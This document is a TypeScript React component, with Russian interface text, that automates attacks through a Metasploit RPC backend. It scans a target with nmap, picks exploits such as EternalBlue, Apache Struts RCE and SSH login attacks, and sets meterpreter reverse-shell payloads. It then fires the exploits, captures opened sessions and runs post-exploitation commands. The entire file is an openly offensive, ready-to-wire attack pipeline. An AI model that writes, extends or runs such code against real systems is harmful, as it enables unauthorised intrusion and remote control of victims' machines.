
import { useState, useCallback } from 'react'
import { useToast } from "@/hooks/use-toast"
import { supabase } from '@/integrations/supabase/client'

interface AutomatedCommandSystemProps {
  isActive: boolean
  onCommandStart: () => void
  onCommandComplete: (results: any) => void
}

export const AutomatedCommandSystem = ({ 
  isActive, 
  onCommandStart, 
  onCommandComplete 
}: AutomatedCommandSystemProps) => {
  const [isRunning, setIsRunning] = useState(false)
  const [currentStep, setCurrentStep] = useState('')
  const { toast } = useToast()

  const executeAutomatedFlow = useCallback(async (target: string) => {
    if (!target || isRunning) return

    setIsRunning(true)
    onCommandStart()

    try {
      // Step 1: Initial reconnaissance
      setCurrentStep('Выполняется разведка...')
      toast({
        title: "Автоматизированная атака",
        description: `Начинаем разведку цели: ${target}`,
      })

      const scanResult = await executeCommand(`nmap -sV -sC ${target}`)
      
      // Step 2: Analyze scan results
      setCurrentStep('Анализ результатов сканирования...')
      const vulnerabilities = await analyzeVulnerabilities(scanResult)

      // Step 3: Select and configure exploits
      setCurrentStep('Выбор эксплойтов...')
      const selectedExploits = await selectExploits(vulnerabilities)

      // Step 4: Execute exploits automatically
      const exploitResults = []
      for (const exploit of selectedExploits) {
        setCurrentStep(`Выполняется эксплойт: ${exploit.name}`)
        toast({
          title: "Выполнение эксплойта",
          description: exploit.name,
        })

        const result = await executeExploit(exploit, target)
        exploitResults.push(result)

        if (result.success) {
          toast({
            title: "Эксплойт успешен!",
            description: `Получена сессия: ${result.sessionId}`,
          })
          
          // Step 5: Post-exploitation if successful
          setCurrentStep('Пост-эксплуатация...')
          await postExploitation(result.sessionId)
        }
      }

      setCurrentStep('Завершено')
      onCommandComplete({
        target,
        scanResult,
        vulnerabilities,
        exploitResults,
        timestamp: new Date()
      })

      toast({
        title: "Автоматизированная атака завершена",
        description: `Обработано ${exploitResults.length} эксплойтов`,
      })

    } catch (error: any) {
      toast({
        title: "Ошибка автоматизации",
        description: error.message,
        variant: "destructive",
      })
    } finally {
      setIsRunning(false)
      setCurrentStep('')
    }
  }, [isRunning, onCommandStart, onCommandComplete, toast])

  const executeCommand = async (command: string) => {
    const { data, error } = await supabase.functions.invoke('metasploit-rpc', {
      body: { action: 'execute', command }
    })
    
    if (error) throw error
    return data.output
  }

  const analyzeVulnerabilities = async (scanOutput: string) => {
    // Parse nmap output and identify potential vulnerabilities
    const vulnerabilities = []
    
    if (scanOutput.includes('ssh')) {
      vulnerabilities.push({
        service: 'ssh',
        port: '22',
        version: extractVersion(scanOutput, 'ssh'),
        exploits: ['auxiliary/scanner/ssh/ssh_login', 'exploit/linux/ssh/sshexec']
      })
    }
    
    if (scanOutput.includes('http')) {
      vulnerabilities.push({
        service: 'http',
        port: '80',
        version: extractVersion(scanOutput, 'http'),
        exploits: ['auxiliary/scanner/http/dir_scanner', 'exploit/multi/http/apache_struts_rce']
      })
    }
    
    if (scanOutput.includes('smb')) {
      vulnerabilities.push({
        service: 'smb',
        port: '445',
        version: extractVersion(scanOutput, 'smb'),
        exploits: ['exploit/windows/smb/ms17_010_eternalblue', 'auxiliary/scanner/smb/smb_login']
      })
    }

    return vulnerabilities
  }

  const extractVersion = (output: string, service: string): string => {
    const regex = new RegExp(`${service}.*?([0-9]+\\.[0-9]+(?:\\.[0-9]+)?)`, 'i')
    const match = output.match(regex)
    return match ? match[1] : 'unknown'
  }

  const selectExploits = async (vulnerabilities: any[]) => {
    const exploits = []
    
    for (const vuln of vulnerabilities) {
      for (const exploitPath of vuln.exploits) {
        exploits.push({
          name: exploitPath,
          service: vuln.service,
          port: vuln.port,
          payload: selectPayload(vuln.service),
          options: generateExploitOptions(vuln)
        })
      }
    }
    
    return exploits.slice(0, 5) // Limit to 5 exploits for safety
  }

  const selectPayload = (service: string): string => {
    const payloads = {
      'ssh': 'linux/x64/meterpreter/reverse_tcp',
      'http': 'linux/x64/meterpreter/reverse_tcp',
      'smb': 'windows/x64/meterpreter/reverse_tcp',
      'default': 'generic/shell_reverse_tcp'
    }
    
    return payloads[service] || payloads.default
  }

  const generateExploitOptions = (vulnerability: any) => {
    return {
      RHOSTS: '', // Will be set dynamically
      RPORT: vulnerability.port,
      LHOST: 'localhost', // Should be configured properly
      LPORT: '4444'
    }
  }

  const executeExploit = async (exploit: any, target: string) => {
    const commands = [
      `use ${exploit.name}`,
      `set RHOSTS ${target}`,
      `set RPORT ${exploit.options.RPORT}`,
      `set PAYLOAD ${exploit.payload}`,
      `set LHOST ${exploit.options.LHOST}`,
      `set LPORT ${exploit.options.LPORT}`,
      'exploit'
    ]

    let sessionId = null
    let success = false

    for (const cmd of commands) {
      const result = await executeCommand(cmd)
      
      if (result.includes('session') && result.includes('opened')) {
        const sessionMatch = result.match(/session (\d+) opened/i)
        if (sessionMatch) {
          sessionId = sessionMatch[1]
          success = true
        }
      }
    }

    return {
      exploit: exploit.name,
      target,
      success,
      sessionId,
      output: 'Exploit execution completed'
    }
  }

  const postExploitation = async (sessionId: string) => {
    const postCommands = [
      `sessions -i ${sessionId}`,
      'sysinfo',
      'getuid',
      'pwd',
      'ls'
    ]

    for (const cmd of postCommands) {
      try {
        await executeCommand(cmd)
      } catch (error) {
        console.log(`Post-exploitation command failed: ${cmd}`)
      }
    }
  }

  return {
    executeAutomatedFlow,
    isRunning,
    currentStep
  }
}
